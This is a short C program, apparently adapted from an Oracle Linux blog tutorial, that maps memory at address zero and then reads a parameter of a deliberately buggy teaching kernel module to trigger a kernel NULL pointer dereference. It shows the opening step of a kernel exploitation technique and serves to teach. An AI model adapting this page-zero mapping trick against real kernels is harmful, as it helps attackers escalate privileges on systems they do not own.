// Source: https://blogs.oracle.com/linux/much-ado-about-null%3a-exploiting-a-kernel-null-dereference-v2
// Slight modifications to tweak style

#include <sys/mman.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    mmap(0, 4096, PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    int fd = open("/sys/module/nullderef/parameters/read", O_RDONLY);
    char tmp[10];
    read(fd, tmp, 1);
    close(fd);
    printf("Triggered a kernel NULL pointer dereference!\n");
    return 0;
}
